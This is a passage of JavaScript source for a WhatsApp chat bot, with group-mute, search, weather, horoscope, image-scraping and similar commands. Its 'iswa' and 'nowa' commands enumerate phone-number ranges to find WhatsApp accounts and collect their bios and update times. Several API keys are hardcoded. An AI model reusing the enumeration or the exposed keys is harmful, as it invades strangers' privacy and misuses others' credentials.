             const mojis = ['💘','💝','💖','💗','💓','💞','💕','💟','❣️','💔','❤️','🧡','💛','💚','💙','💜','🤎','🖤','🤍','❤️‍','🔥','❤️‍','🩹','💯','♨️','💢','💬','👁️‍🗨️','🗨️','🗯️','💭','💤','🌐','♠️','♥️','♦️','♣️','🃏','🀄️','🎴','🎭️','🔇','🔈️','🔉','🔊','🔔','🔕','🎼','🎵','🎶','💹','🏧','🚮','🚰','♿️','🚹️','🚺️','🚻','🚼️','🚾','🛂','🛃','🛄','🛅','⚠️','🚸','⛔️','🚫','🚳','🚭️','🚯','🚱','🚷','📵','🔞','☢️','☣️','⬆️','↗️','➡️','↘️','⬇️','↙️','⬅️','↖️','↕️','↔️','↩️','↪️','⤴️','⤵️','🔃','🔄','🔙','🔚','🔛','🔜','🔝','🛐','⚛️','🕉️','✡️','☸️','☯️','✝️','☦️','☪️','☮️','🕎','🔯','♈️','♉️','♊️','♋️','♌️','♍️','♎️','♏️','♐️','♑️','♒️','♓️','⛎','🔀','🔁','🔂','▶️','⏩️','⏭️','⏯️','◀️','⏪️','⏮️','🔼','⏫','🔽','⏬','⏸️','⏹️','⏺️','⏏️','🎦','🔅','🔆','📶','📳','📴','♀️','♂️','⚧','✖️','➕','➖','➗','♾️','‼️','⁉️','❓️','❔','❕','❗️','〰️','💱','💲','⚕️','♻️','⚜️','🔱','📛','🔰','⭕️','✅','☑️','✔️','❌','❎','➰','➿','〽️','✳️','✴️','❇️','©️','®️','™️','#️⃣','*️⃣','0️⃣','1️⃣','2️⃣','3️⃣','4️⃣','5️⃣','6️⃣','7️⃣','8️⃣','9️⃣','🔟','🔠','🔡','🔢','🔣','🔤','🅰️','🆎','🅱️','🆑','🆒','🆓','ℹ️','🆔','Ⓜ️','🆕','🆖','🅾️','🆗','🅿️','🆘','🆙','🆚','🈁','🈂️','🈷️','🈶','🈯️','🉐','🈹','🈚️','🈲','🉑','🈸','🈴','🈳','㊗️','㊙️','🈺','🈵','🔴','🟠','🟡','🟢','🔵','🟣','🟤','⚫️','⚪️','🟥','🟧','🟨','🟩','🟦','🟪','🟫','⬛️','⬜️','◼️','◻️','◾️','◽️','▪️','▫️','🔶','🔷','🔸','🔹','🔺','🔻','💠','🔘','🔳','🔲','🕛️','🕧️','🕐️','🕜️','🕑️','🕝️','🕒️','🕞️','🕓️','🕟️','🕔️','🕠️','🕕️','🕡️','🕖️','🕢️','🕗️','🕣️','🕘️','🕤️','🕙️','🕥️','🕚️','🕦️','*️','#️','0️','1️','2️','3️','4️','5️','6️','7️','8️','9️','🛎️','🧳','⌛️','⏳️','⌚️','⏰','⏱️','⏲️','🕰️','🌡️','🗺️','🧭','🎃','🎄','🧨','🎈','🎉','🎊','🎎','🎏','🎐','🎀','🎁','🎗️','🎟️','🎫','🔮','🧿','🎮️','🕹️','🎰','🎲','♟️','🧩','🧸','🖼️','🎨','🧵','🧶','👓️','🕶️','🥽','🥼','🦺','👔','👕','👖','🧣','🧤','🧥','🧦','👗','👘','🥻','🩱','🩲','🩳','👙','👚','👛','👜','👝','🛍️','🎒','👞','👟','🥾','🥿','👠','👡','🩰','👢','👑','👒','🎩','🎓️','🧢','⛑️','📿','💄','💍','💎','📢','📣','📯','🎙️','🎚️','🎛️','🎤','🎧️','📻️','🎷','🎸','🎹','🎺','🎻','🪕','🥁','📱','📲','☎️','📞','📟️','📠','🔋','🔌','💻️','🖥️','🖨️','⌨️','🖱️','🖲️','💽','💾','💿️','📀','🧮','🎥','🎞️','📽️','🎬️','📺️','📷️','📸','📹️','📼','🔍️','🔎','🕯️','💡','🔦','🏮','🪔','📔','📕','📖','📗','📘','📙','📚️','📓','📒','📃','📜','📄','📰','🗞️','📑','🔖','🏷️','💰️','💴','💵','💶','💷','💸','💳️','🧾','✉️','💌','📧','🧧','📨','📩','📤️','📥️','📦️','📫️','📪️','📬️','📭️','📮','🗳️','✏️','✒️','🖋️','🖊️','🖌️','🖍️','📝','💼','📁','📂','🗂️','📅','📆','🗒️','🗓️','📇','📈','📉','📊','📋️','📌','📍','📎','🖇️','📏','📐','✂️','🗃️','🗄️','🗑️','🔒️','🔓️','🔏','🔐','🔑','🗝️','🔨','🪓','⛏️','⚒️','🛠️','🗡️','⚔️','💣️','🏹','🛡️','🔧','🔩','⚙️','🗜️','⚖️','🦯','🔗','⛓️','🧰','🧲','⚗️','🧪','🧫','🧬','🔬','🔭','📡','💉','🩸','💊','🩹','🩺','🚪','🛏️','🛋️','🪑','🚽','🚿','🛁','🪒','🧴','🧷','🧹','🧺','🧻','🧼','🧽','🧯','🛒','🚬','⚰️','⚱️','🏺','🕳️','🏔️','⛰️','🌋','🗻','🏕️','🏖️','🏜️','🏝️','🏟️','🏛️','🏗️','🧱','🏘️','🏚️','🏠️','🏡','🏢','🏣','🏤','🏥','🏦','🏨','🏩','🏪','🏫','🏬','🏭️','🏯','🏰','💒','🗼','🗽','⛪️','🕌','🛕','🕍','⛩️','🕋','⛲️','⛺️','🌁','🌃','🏙️','🌄','🌅','🌆','🌇','🌉','🗾','🏞️','🎠','🎡','🎢','💈','🎪','🚂','🚃','🚄','🚅','🚆','🚇️','🚈','🚉','🚊','🚝','🚞','🚋','🚌','🚍️','🚎','🚐','🚑️','🚒','🚓','🚔️','🚕','🚖','🚗','🚘️','🚙','🚚','🚛','🚜','🏎️','🏍️','🛵','🦽','🦼','🛺','🚲️','🛴','🛹','🚏','🛣️','🛤️','🛢️','⛽️','🚨','🚥','🚦','🛑','🚧','⚓️','⛵️','🛶','🚤','🛳️','⛴️','🛥️','🚢','✈️','🛩️','🛫','🛬','🪂','💺','🚁','🚟','🚠','🚡','🛰️','🚀','🛸','🎆','🎇','🎑','🗿','⚽️','⚾️','🥎','🏀','🏐','🏈','🏉','🎾','🥏','🎳','🏏','🏑','🏒','🥍','🏓','🏸','🥊','🥋','🥅','⛳️','⛸️','🎣','🤿','🎽','🎿','🛷','🥌','🎯','🪀','🪁','🎱','🎖️','🏆️','🏅','🥇','🥈','🥉','🍇','🍈','🍉','🍊','🍋','🍌','🍍','🥭','🍎','🍏','🍐','🍑','🍒','🍓','🥝','🍅','🥥','🥑','🍆','🥔','🥕','🌽','🌶️','🥒','🥬','🥦','🧄','🧅','🍄','🥜','🌰','🍞','🥐','🥖','🥨','🥯','🥞','🧇','🧀','🍖','🍗','🥩','🥓','🍔','🍟','🍕','🌭','🥪','🌮','🌯','🥙','🧆','🥚','🍳','🥘','🍲','🥣','🥗','🍿','🧈','🧂','🥫','🍱','🍘','🍙','🍚','🍛','🍜','🍝','🍠','🍢','🍣','🍤','🍥','🥮','🍡','🥟','🥠','🥡','🍦','🍧','🍨','🍩','🍪','🎂','🍰','🧁','🥧','🍫','🍬','🍭','🍮','🍯','🍼','🥛','☕️','🍵','🍶','🍾','🍷','🍸️','🍹','🍺','🍻','🥂','🥃','🥤','🧃','🧉','🧊','🥢','🍽️','🍴','🥄','🔪','🐵','🐒','🦍','🦧','🐶','🐕️','🦮','🐕‍','🦺','🐩','🐺','🦊','🦝','🐱','🐈️','🐈‍','🦁','🐯','🐅','🐆','🐴','🐎','🦄','🦓','🦌','🐮','🐂','🐃','🐄','🐷','🐖','🐗','🐽','🐏','🐑','🐐','🐪','🐫','🦙','🦒','🐘','🦏','🦛','🐭','🐁','🐀','🐹','🐰','🐇','🐿️','🦔','🦇','🐻','🐻‍','❄️','🐨','🐼','🦥','🦦','🦨','🦘','🦡','🐾','🦃','🐔','🐓','🐣','🐤','🐥','🐦️','🐧','🕊️','🦅','🦆','🦢','🦉','🦩','🦚','🦜','🐸','🐊','🐢','🦎','🐍','🐲','🐉','🦕','🦖','🐳','🐋','🐬','🐟️','🐠','🐡','🦈','🐙','🦑','🦀','🦞','🦐','🦪','🐚','🐌','🦋','🐛','🐜','🐝','🐞','🦗','🕷️','🕸️','🦂','🦟','🦠','💐','🌸','💮','🏵️','🌹','🥀','🌺','🌻','🌼','🌷','🌱','🌲','🌳','🌴','🌵','🎋','🎍','🌾','🌿','☘️','🍀','🍁','🍂','🍃','🌍️','🌎️','🌏️','🌑','🌒','🌓','🌔','🌕️','🌖','🌗','🌘','🌙','🌚','🌛','🌜️','☀️','🌝','🌞','🪐','💫','⭐️','🌟','✨','🌠','🌌','☁️','⛅️','⛈️','🌤️','🌥️','🌦️','🌧️','🌨️','🌩️','🌪️','🌫️','🌬️','🌀','🌈','🌂','☂️','☔️','⛱️','⚡️','❄️','☃️','⛄️','☄️','🔥','💧','🌊','💥','💦','💨','😀','😃','😄','😁','😆','😅','🤣','😂','🙂','🙃','😉','😊','😇','🥰','😍','🤩','😘','😗','☺️','😚','😙','😋','😛','😜','🤪','😝','🤑','🤗','🤭','🤫','🤔','🤐','🤨','😐️','😑','😶','😏','😒','🙄','😬','🤥','😌','😔','😪','😮‍','💨','🤤','😴','😷','🤒','🤕','🤢','🤮','🤧','🥵','🥶','😶‍','🌫️','🥴','😵‍','💫','😵','🤯','🤠','🥳','😎','🤓','🧐','😕','😟','🙁','☹️','😮','😯','😲','😳','🥺','😦','😧','😨','😰','😥','😢','😭','😱','😖','😣','😞','😓','😩','😫','🥱','😤','😡','😠','🤬','😈','👿','💀','☠️','💩','🤡','👹','👺','👻','👽️','👾','🤖','😺','😸','😹','😻','😼','😽','🙀','😿','😾','🙈','🙉','🙊','👋','🤚','🖐️','✋','🖖','👌','🤏','✌️','🤞','🤟','🤘','🤙','👈️','👉️','👆️','🖕','👇️','☝️','👍️','👎️','✊','👊','🤛','🤜','👏','🙌','👐','🤲','🤝','🙏','✍️','💅','🤳','💪','🦾','🦿','🦵','🦶','👂️','🦻','👃','🧠','🦷','🦴','👀','👁️','👅','👄','💋','👶','🧒','👦','👧','🧑','👨','👩','🧔','🧔‍♀️','🧔‍♂️','🧑','👨‍','🦰','👩‍','🦰','🧑','👨‍','🦱','👩‍','🦱','🧑','👨‍','🦳','👩‍','🦳','🧑','👨‍','🦲','👩‍','🦲','👱','👱‍♂️','👱‍♀️','🧓','👴','👵','🙍','🙍‍♂️','🙍‍♀️','🙎','🙎‍♂️','🙎‍♀️','🙅','🙅‍♂️','🙅‍♀️','🙆','🙆‍♂️','🙆‍♀️','💁','💁‍♂️','💁‍♀️','🙋','🙋‍♂️','🙋‍♀️','🧏','🧏‍♂️','🧏‍♀️','🙇','🙇‍♂️','🙇‍♀️','🤦','🤦‍♂️','🤦‍♀️','🤷','🤷‍♂️','🤷‍♀️','🧑‍⚕️','👨‍⚕️','👩‍⚕️','🧑‍🎓','👨‍🎓','👩‍🎓','🧑‍🏫','👨‍🏫','👩‍🏫','🧑‍⚖️','👨‍⚖️','👩‍⚖️','🧑‍🌾','👨‍🌾','👩‍🌾','🧑‍🍳','👨‍🍳','👩‍🍳','🧑‍🔧','👨‍🔧','👩‍🔧','🧑‍🏭','👨‍🏭','👩‍🏭','🧑‍💼','👨‍💼','👩‍💼','🧑‍🔬','👨‍🔬','👩‍🔬','🧑‍💻','👨‍💻','👩‍💻','🧑‍🎤','👨‍🎤','👩‍🎤','🧑‍🎨','👨‍🎨','👩‍🎨','🧑‍✈️','👨‍✈️','👩‍✈️','🧑‍🚀','👨‍🚀','👩‍🚀','🧑‍🚒','👨‍🚒','👩‍🚒','👮','👮‍♂️','👮‍♀️','🕵️','🕵️‍♂️','🕵️‍♀️','💂','💂‍♂️','💂‍♀️','👷','👷‍♂️','👷‍♀️','🤴','👸','👳','👳‍♂️','👳‍♀️','👲','🧕','🤵','🤵‍♂️','🤵‍♀️','👰','👰‍♂️','👰‍♀️','🤰','🤱','👩‍','🍼','👨‍','🍼','🧑‍','🍼','👼','🎅','🤶','🧑‍','🎄','🦸','🦸‍♂️','🦸‍♀️','🦹','🦹‍♂️','🦹‍♀️','🧙','🧙‍♂️','🧙‍♀️','🧚','🧚‍♂️','🧚‍♀️','🧛','🧛‍♂️','🧛‍♀️','🧜','🧜‍♂️','🧜‍♀️','🧝','🧝‍♂️','🧝‍♀️','🧞','🧞‍♂️','🧞‍♀️','🧟','🧟‍♂️','🧟‍♀️','💆','💆‍♂️','💆‍♀️','💇','💇‍♂️','💇‍♀️','🚶','🚶‍♂️','🚶‍♀️','🧍','🧍‍♂️','🧍‍♀️','🧎','🧎‍♂️','🧎‍♀️','🧑‍','🦯','👨‍','🦯','👩‍','🦯','🧑‍','🦼','👨‍','🦼','👩‍','🦼','🧑‍','🦽','👨‍','🦽','👩‍','🦽','🏃','🏃‍♂️','🏃‍♀️','💃','🕺','🕴️','👯','👯‍♂️','👯‍♀️','🧖','🧖‍♂️','🧖‍♀️','🧗','🧗‍♂️','🧗‍♀️','🤺','🏇','⛷️','🏂️','🏌️','🏌️‍♂️','🏌️‍♀️','🏄️','🏄‍♂️','🏄‍♀️','🚣','🚣‍♂️','🚣‍♀️','🏊️','🏊‍♂️','🏊‍♀️','⛹️','⛹️‍♂️','⛹️‍♀️','🏋️','🏋️‍♂️','🏋️‍♀️','🚴','🚴‍♂️','🚴‍♀️','🚵','🚵‍♂️','🚵‍♀️','🤸','🤸‍♂️','🤸‍♀️','🤼','🤼‍♂️','🤼‍♀️','🤽','🤽‍♂️','🤽‍♀️','🤾','🤾‍♂️','🤾‍♀️','🤹','🤹‍♂️','🤹‍♀️','🧘','🧘‍♂️','🧘‍♀️','🛀','🛌','🧑‍','🤝‍','🧑','👭','👫','👬','💏','👩‍❤️‍💋‍👨','👨‍❤️‍💋‍👨','👩‍❤️‍💋‍👩','💑','👩‍❤️‍👨','👨‍❤️‍👨','👩‍❤️‍👩','👪️','👨‍👩‍👦','👨‍👩‍👧','👨‍👩‍👧‍👦','👨‍👩‍👦‍👦','👨‍👩‍👧‍👧','👨‍👨‍👦','👨‍👨‍👧','👨‍👨‍👧‍👦','👨‍👨‍👦‍👦','👨‍👨‍👧‍👧','👩‍👩‍👦','👩‍👩‍👧','👩‍👩‍👧‍👦','👩‍👩‍👦‍👦','👩‍👩‍👧‍👧','👨‍👦','👨‍👦‍👦','👨‍👧','👨‍👧‍👦','👨‍👧‍👧','👩‍👦','👩‍👦‍👦','👩‍👧','👩‍👧‍👦','👩‍👧‍👧','🗣️','👤','👥','👣']
             const mokis = mojis[Math.floor(Math.random() * (mojis.length))]
             Void.sendMessage(citel.chat, {
                 react: {
                     text: mokis,
                     key: citel.key
                 }
             })
         }
     
     }) 
















































































































































     cmd({
        pattern: "aunmute",
        desc: "sets unmute time in group.",
        category: "moderation",
    },
    async(Void, citel, text,{ isCreator }) => {
        if (!isCreator) return citel.reply(tlang().owner)
        if(!citel.isGroup) return citel.reply(tlang().group)
        if(!text.split(':')[0]) return citel.reply(`Please provide correct form.\nEg: setmute ${prefix}22:00`)
       // if(!Number.isInteger(text.split(':')[0])) return citel.reply(`Please provide correct form.\nEg: setmute ${prefix}22:00`);
       // if(!Number.isInteger(text.split(':')[1])) return citel.reply(`Please provide correct form.\nEg: setmute ${prefix}22:00`)
              let Group = await sck.findOne({ id: citel.chat })
                if (!Group) {
                    await new sck({ id: citel.chat, unmute: text }).save()
                    return citel.reply('Mute added.')
                } else {
                    await await sck.updateOne({ id: citel.chat }, { unmute:text })
                    return citel.reply(`_Unmute updated for ${text} successfully._`)
                    
                }      
    } 
    )
     //--------------------------------------------------------------------------------
     cmd({
        pattern: "dunmute",
        desc: "Delete unmute from group.",
        category: "moderation",
    },
    async(Void, citel, text,{ isCreator }) => {
        if (!isCreator) return citel.reply(tlang().owner)
        if(!citel.isGroup) return citel.reply(tlang().group)
              let Group = await sck.findOne({ id: citel.chat })
                if (!Group) {
                    return citel.reply('There\'s no unmute set in group.')
                } else {
                    await await sck.updateOne({ id: citel.chat }, { unmute:'false' })
                    return citel.reply('Unmute deleted successfully.')
                    
                }      
    }
    )
     //--------------------------------------------------------------------------------
     cmd({
        pattern: "dmute",
        desc: "Delete mute from group.",
        category: "moderation",
    },
    async(Void, citel, text,{ isCreator }) => {
        if (!isCreator) return citel.reply(tlang().owner)
        if(!citel.isGroup) return citel.reply(tlang().group)
              let Group = await sck.findOne({ id: citel.chat })
                if (!Group) {
                    return citel.reply('There\'s no mute set in group.')
                } else {
                    await await sck.updateOne({ id: citel.chat }, { mute:'false' })
                    return citel.reply('Mute deleted successfully.')
                    
                }      
    }
    )








































    const { shazam } = require('../lib')
    let yts = require("secktor-pack");
    cmd({
            pattern: "find",
            category: "misc",
            desc: "Finds info about song",
            filename: __filename,
        },
        async(Void, citel, text) => {
             let mime = citel.quoted.mtype
             if (!citel.quoted) return citel.reply(`Send/Reply audio  ${prefix}find`);
             if (!/audio/.test(mime)) return citel.reply(`Send/Reply audio ${prefix}shazam`);
             let buff = await citel.quoted.download();
             let data = await shazam(buff);
             if (!data.status) return citel.send(data);
             let search = await yts(data.title);
             let anu = search.videos[0];
             let h =`*Title : _${data.title}_*           
 *Artist : _${data.artists}_*            
 *To Download Song:- _${prefix}yta ${anu.url}_*
    `
 //   *Album :* _${data.album}_    
 //   *Release :* _${data.release_date}
 
 
    let buttonMessaged = {
                    image: { url: anu.thumbnail, },
                    caption: h,
                    footer: tlang().footer,
                    headerType: 4,
                    contextInfo: {
                        externalAdReply: {
                            title: data.artists,
                            body: data.album,
                            thumbnail: log0,
                            mediaType: 2,
                            mediaUrl: ``,
                            sourceUrl: ``,
                        },
                    },
                };
                await Void.sendMessage(citel.chat, buttonMessaged, { quoted: citel, });
        }
     )
     //------------------------------------------------------------------------------------
 cmd({
             pattern: 'ss',
             alias :['webss' , 'fullss'],
             category: "search",
             desc: "Searches Image on Google",
             use: '<text>',
             filename: __filename,
         },
         async(Void, citel, text) => {
 let limit = 5;
  try {
     if (!text) return citel.reply("```Uhh Please, Give me Url!```");
     var url = text;
     let urll = `https://s.vercel.app/api?url=${url.match(/\bhttps?:\/\/\S+/gi)[0]}&width=1280&height=720`
     let media  = await getBuffer(urll)
     return await Void.sendMessage(citel.chat ,{image : media } , {quoted:citel} )
  }
 catch (err) { return citel.reply("```Error While Fetching Snapshot```")}
         }
     )
 
 
 
     //---------------------------------------------------------------------------
 cmd({
             pattern: "imdb",
             category: "search",
             desc: "Sends image of asked Movie/Series.",
             use: '<text>',
             filename: __filename,
         },
         async(Void, citel, text) => {
             if (!text) return citel.reply(`_Name a Series or movie ${tlang().greet}._`);
             let fids = await axios.get(`http://www.omdbapi.com/?apikey=742b2d09&t=${text}&plot=full`);
             let imdbt = "";
             console.log(fids.data)
             imdbt += "⚍⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚍\n" + " ``` 𝕀𝕄𝔻𝔹 𝕊𝔼𝔸ℝℂℍ```\n" + "⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎\n";
             imdbt += "🎬Title      : " + fids.data.Title + "\n";
             imdbt += "📅Year       : " + fids.data.Year + "\n";
             imdbt += "⭐Rated      : " + fids.data.Rated + "\n";
             imdbt += "📆Released   : " + fids.data.Released + "\n";
             imdbt += "⏳Runtime    : " + fids.data.Runtime + "\n";
             imdbt += "🌀Genre      : " + fids.data.Genre + "\n";
             imdbt += "👨🏻‍💻Director   : " + fids.data.Director + "\n";
             imdbt += "✍Writer     : " + fids.data.Writer + "\n";
             imdbt += "👨Actors     : " + fids.data.Actors + "\n";
             imdbt += "📃Plot       : " + fids.data.Plot + "\n";
             imdbt += "🌐Language   : " + fids.data.Language + "\n";
             imdbt += "🌍Country    : " + fids.data.Country + "\n";
             imdbt += "🎖️Awards     : " + fids.data.Awards + "\n";
             imdbt += "📦BoxOffice  : " + fids.data.BoxOffice + "\n";
             imdbt += "🏙️Production : " + fids.data.Production + "\n";
             imdbt += "🌟imdbRating : " + fids.data.imdbRating + "\n";
             imdbt += "❎imdbVotes  : " + fids.data.imdbVotes + "\n";
             imdbt += Config.caption ;
             Void.sendMessage(citel.chat, {  image: { url: fids.data.Poster, }, caption: imdbt,  }, {   quoted: citel,  });
 
         }
     )
     //---------------------------------------------------------------------------
 cmd({
             pattern: "weather",
             category: "search",
             desc: "Sends weather info about asked place.",
             use: '<location>',
             filename: __filename,
         },
         async(Void, citel, text) => {
             if (!text) return citel.reply(`Give me location.Baka!!`);
             let wdata = await axios.get(
                 `https://api.openweathermap.org/data/2.5/weather?q=${text}&units=metric&appid=060a6bcfa19809c2cd4d97a212b19273&language=en`
             );
             let textw = "";
             textw += `*🌟Weather of  ${text}*\n\n`;
             textw += `*Weather:-* ${wdata.data.weather[0].main}\n`;
             textw += `*Description:-* ${wdata.data.weather[0].description}\n`;
             textw += `*Avg Temp:-* ${wdata.data.main.temp}\n`;
             textw += `*Feels Like:-* ${wdata.data.main.feels_like}\n`;
             textw += `*Pressure:-* ${wdata.data.main.pressure}\n`;
             textw += `*Humidity:-* ${wdata.data.main.humidity}\n`;
             textw += `*Humidity:-* ${wdata.data.wind.speed}\n`;
             textw += `*Latitude:-* ${wdata.data.coord.lat}\n`;
             textw += `*Longitude:-* ${wdata.data.coord.lon}\n`;
             textw += `*Country:-* ${wdata.data.sys.country}\n`;
             textw +=Config.caption ;
 
             Void.sendMessage( citel.chat, {  text: textw }, {  quoted: citel } );
 
         }
     )
     //---------------------------------------------------------------------------
 cmd({
             pattern: "horo",
             category: "search",
             desc: "Gives horoscope info of user.",
             use: '<sign>\n:Example: horo libra',
             filename: __filename,
         },
         async(Void, citel, text) => {
             if (!text) return citel.reply(`Provide me a sign!`)
             try {
                 const URL = `https://aztro.sameerkumar.website/?sign=${text}&day=today`;
                 fetch(URL, {
                         method: 'POST'
                     })
                     .then(response => response.json())
                     .then(json => {
                         const date = json.current_date;
                         console.log(date);
                         let textw = "";
                         textw += `*🌟 Horoscope of  ${text}*\n\n`;
                         textw += `*Current Date:* ${json.current_date}.\n`;
                         textw += `*Sign:* ${text}.\n`;
                         textw += `*Lucky Time:* ${json.lucky_time}.\n`;
                         textw += `*Compatibility:* ${json.compatibility}.\n`;
                         textw += `*Lucky Number:* ${json.lucky_number}.\n`;
                         textw += `*Lucky Color:* ${json.color}.\n`;
                         textw += `*Today Mood:* ${json.mood}.\n`;
                         textw += `*Overall:* ${json.description}.\n`;
                         textw +=Config.caption ;
                         citel.reply(textw)
                     });
 
             } catch (e) {   console.log(e)  }
         }
     )
     //---------------------------------------------------------------------------
 
 cmd({
             pattern: "cric",
             alias :['search','gsearch'],
             category: "search",
             desc: "Sends info of given query from Google Search.",
             use: '<text>',
             filename: __filename,
         },
         async(Void, citel, text) => {
 
           citel.reply (`*_Please Wait, Getting Cricket Info_*`);
 const response = await fetch('https://api.cricapi.com/v1/currentMatches?apikey=f68d1cb5-a9c9-47c5-8fcd-fbfe52bace78');
   const dat = await response.json();
 console.log(dat);
 
 for (let i=0 ; i <  dat.data.length; i++) {
 let j = i+1;
 text +=`\n*--------------------- MATCH ${i}-------------------*`;
 text +="\n*Match Name  :* "+ dat.data[i].name;
 text +="\n*Match Status  :* "+ dat.data[i].status;
 text +="\n*Match  Date   :* " + dat.data[i].dateTimeGMT ;
 text +="\n*Match Started :* " + dat.data[i].matchStarted;
 text +="\n*Match Ended:* " + dat.data[i].matchEnded;
 
 }
  return await citel.reply( text);
 
 
 })
 
 //---------------------------------------------------------------------------
 cmd({
             pattern: "google",
             alias :['search','gsearch'],
             category: "search",
             desc: "Sends info of given query from Google Search.",
             use: '<text>',
             filename: __filename,
         },
         async(Void, citel, text) => {
             if (!text) return citel.reply(`give me a query\n*Example : .google Who is Suhail Tech.*`);
             let google = require('google-it');
             google({ 'query': text}).then(res => {
                 let msg= `Google Search From : ${text} \n\n`;
                 for (let g of res) {
                     msg+= `➣ Title : ${g.title}\n`;
                     msg+= `➣ Description : ${g.snippet}\n`;
                     msg+= `➣ Link : ${g.link}\n\n────────────────────────\n\n`;
                 }
              
                 return citel.reply(msg);
             })
         }
     )
     //---------------------------------------------------------------------------
 cmd({
             pattern: "image",
             alias: ["img" , "pic"],
             category: "search",
             desc: "Searches Image on Google",
             use: '<text>',
             filename: __filename,
         },
         async(Void, citel, text) => {
 
    if (!text) return citel.reply(`Provide me a query!\n*Ex : .image luffy |10*`)
    let buttonMessage = {}
    let name1 = text.split("|")[0] || `Luffy`
    let name2 = text.split("|")[1] || `5`
  try {
     let urlsArray = [];
     const params = {
         q: name1, 
         tbm: "isch",
         hl: "en",
         gl: "in",
         ijn: "0", 
     };
     const headers = {
       "User-Agent":
           "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36",
       "Accept-Encoding": "application/json",
   };
   
     const res = await axios.get("https://www.google.com/search", { headers: headers, params: params });
     let body = res.data;
     body = body.slice(body.lastIndexOf("AF_initDataCallback"));
     body = body.slice(body.indexOf("["));
     body = body.slice(0, body.indexOf("</script>")-1);
     body = body.slice(0, body.lastIndexOf(","));
     
     const img = JSON.parse(body);
 
     const imgObjects = img[56][1][0][0][1][0];
     for (let i = 0; i < name2; i++) {
         if (imgObjects[i] && imgObjects[i][0][0]["444383007"][1]) {
             let url = imgObjects[i][0][0]["444383007"][1][3][0]; // the url
             urlsArray.push(url);
         }
     }
 
 for (let url of urlsArray) { Void.sendMessage(citel.chat , {image : {url : url} } )  }
 } 
  catch (error) {   return citel.reply("*Google Images Not Working, Try it Later*"); }
 
  
  
  /*
  
 let isImages = false;
             let num = text.split("|")[1];
  gis(name1, async(error, result) => { 
 if(result.length) 
 {
  isImages = true;
  citel.reply(`Sending images of ${name1} in chat`) 
 }
 else return citel.reply("*Google Images Not Working, Try it Later*");
 })
      if(!isImages) return       
             let nn = name2
             for (let i = 0; i < nn; i++) {
             gis(name1, async(error, result) => { 
             n = result;
             images = n[Math.floor(Math.random() * n.length)].url;
             
              
              if(!num){ buttonMessage = {   image: { url: images },
                                 caption: Config.caption,
                                 }
              }else {  buttonMessage = {   image: { url: images },}   }
                     
              
              Void.sendMessage(citel.chat, buttonMessage, { quoted: citel });
                 })
             }
             
             
             */
  })
     //---------------------------------------------------------------------------
 cmd({
             pattern: "couplepp",
             category: "search",
             desc: "Sends two couples pics.",
             filename: __filename,
         },
         async(Void, citel, text) => {
             let anu = await fetchJson('https://raw.githubusercontent.com/iamriz7/kopel_/main/kopel.json')
             let random = anu[Math.floor(Math.random() * anu.length)]
             Void.sendMessage(citel.chat, { image: { url: random.male }, caption: `Couple Male` }, { quoted: citel })
             Void.sendMessage(citel.chat, { image: { url: random.female }, caption: `Couple Female` }, { quoted: citel })
         }
     ) 
     //---------------------------------------------------------------------------
 cmd({
         pattern: "iswa",
         alias: ["oldwa","bio","onwa"],
         category: "search",
         desc: "Searches in given rage about given number.",
         use: '9112345678xx',
         filename: __filename,
     },
     async(Void, citel, text) => {
  if(!text) return await citel.reply('Give Me Number without + sign. Example: .iswa 9231844741xx')
         var inputnumber = text.split(" ")[0]
         if (!inputnumber.includes('x')) return citel.reply(`*You did not add x*\nExample: iswa 9231844741xx  \n ${Config.caption}`)
         citel.reply(`*Searching for WhatsApp account in given range...* \n ${Config.caption}`)
 
         function countInstances(string, word) {  return string.split(word).length - 1; }
         var number0 = inputnumber.split('x')[0]
         var number1 = inputnumber.split('x')[countInstances(inputnumber, 'x')] ? inputnumber.split('x')[countInstances(inputnumber, 'x')] : ''
         var random_length = countInstances(inputnumber, 'x')
         var randomxx;
         if (random_length == 1) { randomxx = 10 } 
         else if (random_length == 2) { randomxx = 100 } 
         else if (random_length == 3) { randomxx = 1000 }
  
         text = `*--『 List of Whatsapp Numbers 』--*\n\n`
         var nobio = `\n*Bio:* || \nHey there! I am using WhatsApp.\n`
         var nowhatsapp = `\n*Numbers with no WhatsApp account within provided range.*\n`
         for (let i = 0; i < randomxx; i++) {
             var nu = ['1', '2', '3', '4', '5', '6', '7', '8', '9']
             var status1 = nu[Math.floor(Math.random() * nu.length)]
             var status2 = nu[Math.floor(Math.random() * nu.length)]
             var status3 = nu[Math.floor(Math.random() * nu.length)]
             var dom4 = nu[Math.floor(Math.random() * nu.length)]
             var random;
             if (random_length == 1) { random = `${status1}` } 
             else if (random_length == 2) {random = `${status1}${status2}` } 
             else if (random_length == 3) {random = `${status1}${status2}${status3}` } 
             else if (random_length == 4) {random = `${status1}${status2}${status3}${dom4}` }
          
             var anu = await Void.onWhatsApp(`${number0}${i}${number1}@s.whatsapp.net`);
             var anuu = anu.length !== 0 ? anu : false
             try 
             {
                   try { var anu1 = await Void.fetchStatus(anu[0].jid); } 
                   catch { var anu1 = '401' ; }
                   if (anu1 == '401' || anu1.status.length == 0) { nobio += `wa.me/${anu[0].jid.split("@")[0]}\n` ; } 
                   else {  text += `🧐 *Number:* wa.me/${anu[0].jid.split("@")[0]}\n ✨*Bio :* ${anu1.status}\n🍁*Last update :* ${moment(anu1.setAt).tz('Asia/Kolkata').format('HH:mm:ss DD/MM/YYYY')}\n\n` ;   }
             } catch { nowhatsapp += `${number0}${i}${number1}\n`; }
         }
         return await citel.reply(`${text}${nobio}${nowhatsapp}`)
 
     }
 )
 
 
 cmd({
         pattern: "nowa",
         category: "search",
         desc: "Searches in given rage about given number.",
         use: '9112345678xx',
         filename: __filename,
     },
     async(Void, citel, text) => {
 if(!text) return await citel.reply('Give Me Number without + sign. Example: .nowa 9231844741xx')
 const inputNumber = text.split(" ")[0]
 if (!inputNumber.includes('x')) return citel.reply(`*You did not add x in number.*\nExample: ${prefix}nowa 9231844741xx  \n ${Config.caption}`)
 citel.reply(`*Searching for WhatsApp account in the given range...*\n${Config.caption}`);
 function countInstances(string, word) { return string.split(word).length - 1; }
 const number0 = inputNumber.split('x')[0];
 const number1 = inputNumber.split('x').slice(-1)[0] || '';
 const randomLength = countInstances(inputNumber, 'x');
 const randomxx = [10, 100, 1000][randomLength - 1] || 0;
